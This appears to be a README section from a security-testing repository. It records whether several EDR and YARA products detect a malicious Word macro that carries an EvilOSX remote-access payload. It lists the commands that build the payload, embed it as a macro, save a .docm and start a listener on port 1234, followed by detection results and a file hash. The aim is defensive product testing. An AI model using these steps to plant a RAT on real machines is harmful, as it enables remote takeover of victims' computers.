**Detections**
* Enterprise EDR Solution 1: Yes (Blocked)
* Enterprise EDR Solution 2: No
* Enterprise YARA Solution: No (Detected EvilOSX payload and some modules but not the word doc)

We use a python script to generate a malicious office macro from the EvilOSX framework. The following repos are used: https://github.com/Marten4n6/EvilOSX
https://github.com/cedowens/EvilOSX_MacroGenerator 

Here we are using EvilOSX which is a Remote Administrator tool (RAT) for Mac OS. We generate a payload using this framework and create a shell that will connect to our VM over port 1234.

`git clone https://github.com/Marten4n6/EvilOSX`

`cd EvilOSX`

`python start.py --builder`

The options defined within the builder are as follows.
![image](https://github.com/lawrence737/EDR-YARA-Testing/assets/82233556/ceb1e03c-5eb4-4aba-acfc-93c159de78d0)


The macro generator repo is used to get the payload into a macro we can use in Word.

`git clone https://github.com/cedowens/EvilOSX_MacroGenerator`

`cd EvilOSX_MacroGenerator`

`python3 EvilOSX-macrogenerator.py -p /Users/red/EvilOSX/data/builds/Launcher-2ef41c.py -e "b64"`

A text file is then generated as “macro.txt” and this can be used to populate the VBA code in Word. This is then saved as a .docm file.

![image](https://github.com/lawrence737/EDR-YARA-Testing/assets/82233556/e5bad9ad-1b42-4bc6-bea3-9c3705e5ae7c)
![image](https://github.com/lawrence737/EDR-YARA-Testing/assets/82233556/74a6b6df-b3ab-4ecc-86a5-5ed561e6257b)


On the VM, we start the listener.

`python start.py --cli --port 1234`

Finally, we open the file and enable macros when word asks us.

![image](https://github.com/lawrence737/EDR-YARA-Testing/assets/82233556/321d1394-ea4e-4daf-98ae-434aa4903b7c)

Enterprise EDR Solution 1 immediately kills Word, kills sh, and quarantines Word. Quarantine is lifted to fix the Word application. Note that the file itself is not quarantined.

Hashes:

7c15014b76c207bad85b5434926f46d051dc774d31eb71a322069de48b70fa77  evilmacro.docm

